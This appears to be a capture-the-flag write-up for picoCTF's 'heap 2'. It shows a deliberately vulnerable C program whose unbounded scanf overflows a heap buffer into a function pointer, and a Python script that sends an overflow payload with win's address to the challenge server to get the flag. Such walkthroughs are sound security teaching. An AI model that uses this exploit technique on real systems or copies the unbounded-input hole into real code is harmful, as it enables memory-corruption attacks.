# heap 2

```markdown
Tags: `Binary Exploitation` `heap` `browser_webshell_solvable`
```

## **Description**

Can you handle function pointers?

<figure><img src="../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

```bash
gdb ./chall
break main
p &win
```

<figure><img src="../.gitbook/assets/Pasted image 1 (6).png" alt=""><figcaption></figcaption></figure>

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

* This C program presents a menu-driven interface where the user can perform various actions.
* It initializes two heap-allocated variables: `input_data` and `x`.
* The `init` function initializes the program by allocating memory for `input_data` and `x`, and setting initial values for them.
* The `print_menu` function prints a menu for the user to choose from various options.
* The `write_buffer` function allows the user to write data to the `input_data` buffer.
* The `print_heap` function prints the addresses and values stored in `input_data` and `x`.
* The `win` function is intended to print the flag by opening and reading from the file "flag.txt". It is indirectly called by the `check_win` function.
* The `check_win` function attempts to call the function pointer stored in `x`. If `x` points to the `win` function, the flag is printed. Otherwise, an attempt is made to execute whatever function `x` points to.
* The `main` function runs the main loop of the program, continuously displaying the menu and executing the corresponding actions based on the user's choice.
* It handles user input validation and ensures the program continues running until the user chooses to exit.

## Solution Strategy

```python
import socket
import time

def send_command(sock, command, wait_time=1):
    """Send a command to the server and print the response."""
    sock.sendall(command)
    time.sleep(wait_time) 
    response = sock.recv(4096)
    print_safe(response)

def print_safe(binary_data):
    """Print binary data safely by trying to decode or printing a safe representation."""
    try:
        print(binary_data.decode('utf-8'), end='')
    except UnicodeDecodeError:
        print(repr(binary_data), end='')

def main():
    HOST = 'mimas.picoctf.net'
    PORT = 65214 

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        response = s.recv(1024)
        print_safe(response)

        print("Sending data to buffer...")
        payload = b"A" * 32 + b"\xa0\x11\x40\x00\n"
        send_command(s, b'2\n', 2)  
        send_command(s, payload, 2) 

        print("Confirming x is overwritten...")
        send_command(s, b'3\n', 2) 

        print("Attempting to print the flag...")
        send_command(s, b'4\n', 2)

if __name__ == "__main__":
    main()
```

* This Python script establishes a TCP connection to a server (`mimas.picoctf.net`) on port `65214`.
* It sends commands to the server to interact with a menu-driven interface.
* The `send_command` function sends a command to the server and waits for a specified amount of time to receive the response.
* The `print_safe` function safely prints binary data by attempting to decode it as UTF-8 and falling back to a safe representation using `repr()` if decoding fails.
* In the `main` function:
  * It first establishes a connection to the server.
  * It receives and prints the initial menu from the server.
  * It sends a payload to the server to overwrite a buffer, which presumably leads to a vulnerability.
  * It confirms if the payload successfully overwrites the target buffer by choosing the option to print the overwritten data.
  * It attempts to print the flag by selecting the appropriate menu option.
* The script allows for adjustable wait times to ensure server responses are properly captured.
* It's designed to interact with a specific server and assumes a certain protocol and behavior. Adjustments may be necessary for different servers or interfaces.

## Flag

<figure><img src="../.gitbook/assets/Pasted image (30).png" alt=""><figcaption></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
